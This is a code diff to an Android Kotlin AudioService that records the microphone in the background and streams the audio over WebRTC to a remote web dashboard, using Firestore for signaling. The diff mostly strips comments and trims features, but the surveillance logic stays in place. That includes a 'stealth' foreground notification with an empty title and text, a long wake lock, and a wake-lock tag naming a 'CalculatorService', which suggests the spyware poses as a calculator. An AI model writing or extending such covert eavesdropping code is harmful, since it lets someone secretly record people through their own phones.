@@ -37,7 +37,6 @@ class AudioService : Service() {
     private var peerConnectionFactory: PeerConnectionFactory? = null
     private var audioSource: AudioSource? = null
     private var audioTrack: AudioTrack? = null
-    private var dataChannel: DataChannel? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -65,24 +64,13 @@ class AudioService : Service() {
 
         serviceScope.launch {
             try {
-                // Acquire wake lock to keep CPU running
                 acquireWakeLock()
-
-                // Start foreground with minimal notification
                 startForeground(NOTIFICATION_ID, createStealthNotification())
-
-                // Initialize WebRTC
                 initializeWebRTC()
-
-                // Start audio capture
                 startAudioCapture()
-
-                // Connect to signaling server
                 connectSignaling()
-
                 isStreaming = true
                 Log.d(TAG, "Streaming started")
-
             } catch (e: Exception) {
                 Log.e(TAG, "Error starting streaming", e)
                 stopStreaming()
@@ -92,57 +80,38 @@ class AudioService : Service() {
 
     private fun stopStreaming() {
         isStreaming = false
-
         audioTrack?.dispose()
         audioTrack = null
-
         audioSource?.dispose()
         audioSource = null
-
         audioRecord?.release()
         audioRecord = null
-
         peerConnection?.close()
         peerConnection = null
-
         peerConnectionFactory?.dispose()
         peerConnectionFactory = null
-
         releaseWakeLock()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
-
         Log.d(TAG, "Streaming stopped")
     }
 
     private fun initializeWebRTC() {
-        // Initialize EglBase for WebRTC
         val eglBase = EglBase.create()
 
-        // Initialize WebRTC factory
         val initOptions = PeerConnectionFactory.InitializationOptions.builder(this)
             .setEnableInternalTracer(false)
             .createInitializationOptions()
         PeerConnectionFactory.initialize(initOptions)
 
-        val encoderFactory = DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, true)
-        val decoderFactory = DefaultVideoDecoderFactory(eglBase.eglBaseContext)
-
         peerConnectionFactory = PeerConnectionFactory.builder()
-            .setVideoEncoderFactory(encoderFactory)
-            .setVideoDecoderFactory(decoderFactory)
             .createPeerConnectionFactory()
 
-        // Create peer connection
         val iceServers = listOf(
-            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
-            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
+            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
         )
 
-        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
-            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
-            continuousGathering = PeerConnection.ContinuousGatheringPolicy.GATHER_CONTINUALLY
-        }
+        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
 
         peerConnection = peerConnectionFactory?.createPeerConnection(
             rtcConfig,
@@ -150,20 +119,14 @@ class AudioService : Service() {
                 override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
                 override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
                 override fun onIceConnectionReceivingChange(receiving: Boolean) {}
-                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {
-                    if (state == PeerConnection.IceGatheringState.COMPLETE) {
-                        Log.d(TAG, "ICE gathering complete")
-                    }
-                }
+                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
                 override fun onIceCandidate(candidate: IceCandidate?) {
                     candidate?.let { sendIceCandidate(it) }
                 }
                 override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
                 override fun onAddStream(stream: MediaStream?) {}
                 override fun onRemoveStream(stream: MediaStream?) {}
-                override fun onDataChannel(channel: DataChannel?) {
-                    dataChannel = channel
-                }
+                override fun onDataChannel(channel: DataChannel?) {}
                 override fun onRenegotiationNeeded() {}
                 override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
             }
@@ -181,25 +144,17 @@ class AudioService : Service() {
             bufferSize * 2
         )
 
-        // Create audio source and track
         audioSource = peerConnectionFactory?.createAudioSource(MediaConstraints())
         audioTrack = peerConnectionFactory?.createAudioTrack("audio_track", audioSource)
 
-        // Add track to peer connection
-        val sender = peerConnection?.addTrack(audioTrack, listOf("stream"))
+        peerConnection?.addTrack(audioTrack, listOf("stream"))
 
-        // Start capturing audio
         audioRecord?.startRecording()
 
-        // Create audio track to stream
         serviceScope.launch(Dispatchers.IO) {
             val buffer = ByteArray(1024)
             while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
-                val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
-                if (bytesRead > 0) {
-                    // Audio data is being captured and sent via WebRTC
-                    // The audioTrack automatically sends data through the peer connection
-                }
+                audioRecord?.read(buffer, 0, buffer.size)
             }
         }
     }
@@ -207,7 +162,6 @@ class AudioService : Service() {
     private fun connectSignaling() {
         val deviceId = DeviceRegistrar.getDeviceId(this)
 
-        // Register device in Firestore
         val deviceData = hashMapOf(
             "deviceId" to deviceId,
             "status" to "online",
@@ -219,7 +173,6 @@ class AudioService : Service() {
             .set(deviceData)
             .addOnSuccessListener {
                 Log.d(TAG, "Device registered: $deviceId")
-                // Listen for signaling messages
                 listenForSignaling(deviceId)
             }
             .addOnFailureListener { e ->
@@ -228,7 +181,6 @@ class AudioService : Service() {
     }
 
     private fun listenForSignaling(deviceId: String) {
-        // Listen for offer from web dashboard
         firestore.collection("signaling")
             .document(deviceId)
             .addSnapshotListener { snapshot, e ->
@@ -259,7 +211,6 @@ class AudioService : Service() {
         serviceScope.launch {
             try {
                 val offerSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)
-
                 peerConnection?.setRemoteDescription(offerSdp, object : SdpObserver {
                     override fun onCreateSuccess(sdp: SessionDescription?) {}
                     override fun onCreateFailure(error: String?) {}
@@ -274,7 +225,7 @@ class AudioService : Service() {
                                             sendAnswer(it.description, deviceId)
                                         }
                                         override fun onSetFailure(error: String?) {
-                                            Log.e(TAG, "Set local description failed: $error")
+                                            Log.e(TAG, "Set local failed: $error")
                                         }
                                     })
                                 }
@@ -283,13 +234,11 @@ class AudioService : Service() {
                                 Log.e(TAG, "Create answer failed: $error")
                             }
                             override fun onSetSuccess() {}
-                            override fun onSetFailure(error: String?) {
-                                Log.e(TAG, "Create answer set failed: $error")
-                            }
+                            override fun onSetFailure(error: String?) {}
                         })
                     }
                     override fun onSetFailure(error: String?) {
-                        Log.e(TAG, "Set remote description failed: $error")
+                        Log.e(TAG, "Set remote failed: $error")
                     }
                 })
             } catch (e: Exception) {
@@ -354,7 +303,6 @@ class AudioService : Service() {
     }
 
     private fun createStealthNotification(): Notification {
-        // Minimal notification that doesn't draw attention
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("")
             .setContentText("")
@@ -372,7 +320,7 @@ class AudioService : Service() {
             PowerManager.PARTIAL_WAKE_LOCK,
             "CalculatorService::WakeLock"
         ).apply {
-            acquire(60 * 60 * 1000L) // 1 hour
+            acquire(60 * 60 * 1000L)
         }
     }
 
